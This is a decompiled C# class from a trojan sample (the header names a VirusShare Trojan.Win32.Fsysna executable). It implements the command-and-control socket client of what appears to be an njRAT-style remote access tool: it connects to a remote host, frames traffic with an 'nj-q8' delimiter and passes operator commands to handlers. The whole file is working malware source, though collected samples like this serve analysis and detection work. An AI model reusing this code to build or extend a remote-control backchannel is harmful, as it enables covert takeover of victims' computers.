﻿// Decompiled with JetBrains decompiler
// Type: n.SocketsClient
// Assembly: n, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BFCF94BC-F711-4A63-941E-52FC7F306AC7
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00004-msil\Trojan.Win32.Fsysna.wh-0adec5f2e37dcb28180512f882c1aec3a7f939bf33e4147587c7b7277719444b.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using n.My;
using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace n
{
  public class SocketsClient
  {
    private static string response = string.Empty;
    private static int port;
    private static IPHostEntry ipHostInfo;
    private static IPAddress ipAddress;
    private static Socket client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
    private byte[] Spl;
    private static int ct;

    public SocketsClient() => this.Spl = this.STB("nj-q8");

    public void AT(byte[] D)
    {
      MyProject.MyForms forms = MyProject.Forms;
      Form b = (Form) forms.B;
      n.Delegates.T.T.appendText(ref b, ref D);
      forms.B = (B) b;
    }

    public event SocketsClient.onConnectEventHandler onConnect;

    public event SocketsClient.onErrorEventHandler onError;

    public event SocketsClient.onDataArrivalEventHandler onDataArrival;

    public event SocketsClient.onDisconnectEventHandler onDisconnect;

    public event SocketsClient.onSendCompleteEventHandler onSendComplete;

    public void Connect(string RemoteHostName, int RemotePort)
    {
      try
      {
        SocketsClient.client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        SocketsClient.port = RemotePort;
        SocketsClient.ipHostInfo = Dns.Resolve(RemoteHostName);
        SocketsClient.ipAddress = SocketsClient.ipHostInfo.AddressList[0];
        IPEndPoint remoteEP = new IPEndPoint(SocketsClient.ipAddress, SocketsClient.port);
        SocketsClient.client.BeginConnect((EndPoint) remoteEP, new AsyncCallback(this.sockConnected), (object) SocketsClient.client);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        SocketsClient.onDisconnectEventHandler onDisconnectEvent = this.onDisconnectEvent;
        if (onDisconnectEvent != null)
          onDisconnectEvent();
        ProjectData.ClearProjectError();
      }
    }

    public void SendData(byte[] Data)
    {
      try
      {
        MemoryStream memoryStream = new MemoryStream();
        memoryStream.Write(Data, 0, Data.Length);
        memoryStream.Write(this.Spl, 0, this.Spl.Length);
        memoryStream.ToArray();
        SocketsClient.client.Send(memoryStream.ToArray(), memoryStream.ToArray().Length, SocketFlags.None);
        memoryStream.Dispose();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void Disconnect()
    {
      try
      {
        SocketsClient.client.Shutdown(SocketShutdown.Both);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        SocketsClient.client.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public byte[] STB(string Data) => Encoding.Default.GetBytes(Data);

    public string BTS(byte[] Data) => Encoding.Default.GetString(Data);

    private void sockConnected(IAsyncResult ar)
    {
      try
      {
        if (!SocketsClient.client.Connected)
        {
          SocketsClient.onDisconnectEventHandler onDisconnectEvent = this.onDisconnectEvent;
          if (onDisconnectEvent == null)
            return;
          onDisconnectEvent();
        }
        else
        {
          SocketsClient.client.ReceiveBufferSize = 99999;
          SocketsClient.client.ReceiveTimeout = -1;
          SocketsClient.client.SendTimeout = -1;
          SocketsClient.client.ReceiveTimeout = 9000;
          ++SocketsClient.ct;
          new Thread(new ThreadStart(this.DDD)).Start();
          SocketsClient.onConnectEventHandler onConnectEvent = this.onConnectEvent;
          if (onConnectEvent == null)
            return;
          onConnectEvent();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        SocketsClient.onDisconnectEventHandler onDisconnectEvent = this.onDisconnectEvent;
        if (onDisconnectEvent != null)
          onDisconnectEvent();
        ProjectData.ClearProjectError();
      }
    }

    public void DDD()
    {
      int ct = SocketsClient.ct;
      MemoryStream memoryStream = new MemoryStream();
      while (true)
      {
        int num;
        ++num;
        Thread.Sleep(5);
        if (ct >= SocketsClient.ct)
        {
          try
          {
            if (num > 200)
            {
              try
              {
                if (SocketsClient.client.Poll(-1, SelectMode.SelectRead) & SocketsClient.client.Available <= 0)
                {
                  MyProject.Forms.B.Dis();
                  break;
                }
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                MyProject.Forms.B.Dis();
                ProjectData.ClearProjectError();
                break;
              }
              num = 0;
            }
            if (SocketsClient.client.Available > 0)
            {
              byte[] numArray = new byte[SocketsClient.client.Available - 1 + 1];
              SocketsClient.client.Receive(numArray, numArray.Length, SocketFlags.None);
              if (Strings.InStr(this.BTS(numArray), "nj-q8") > 0)
              {
                memoryStream.Write(numArray, 0, numArray.Length);
                new Thread((ParameterizedThreadStart) (a0 => this.EFE((byte[]) a0))).Start((object) memoryStream.ToArray());
                memoryStream = new MemoryStream();
              }
              else
                memoryStream.Write(numArray, 0, numArray.Length);
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        else
          break;
      }
    }

    public void EFE(byte[] B)
    {
      SocketsClient.onDataArrivalEventHandler dataArrivalEvent = this.onDataArrivalEvent;
      if (dataArrivalEvent == null)
        return;
      dataArrivalEvent(B, B.Length - 1);
    }

    private void sockSendEnd(IAsyncResult ar)
    {
      try
      {
        int DataSize = ((Socket) ar.AsyncState).EndSend(ar);
        SocketsClient.onSendCompleteEventHandler sendCompleteEvent = this.onSendCompleteEvent;
        if (sendCompleteEvent == null)
          return;
        sendCompleteEvent(DataSize);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        SocketsClient.onErrorEventHandler onErrorEvent = this.onErrorEvent;
        if (onErrorEvent != null)
          onErrorEvent(Information.Err().Description);
        ProjectData.ClearProjectError();
      }
    }

    public bool Connected()
    {
      bool flag;
      try
      {
        flag = SocketsClient.client.Connected;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        ProjectData.ClearProjectError();
      }
      return flag;
    }

    public delegate void onConnectEventHandler();

    public delegate void onErrorEventHandler(string Description);

    public delegate void onDataArrivalEventHandler(byte[] Data, int TotalBytes);

    public delegate void onDisconnectEventHandler();

    public delegate void onSendCompleteEventHandler(int DataSize);
  }
}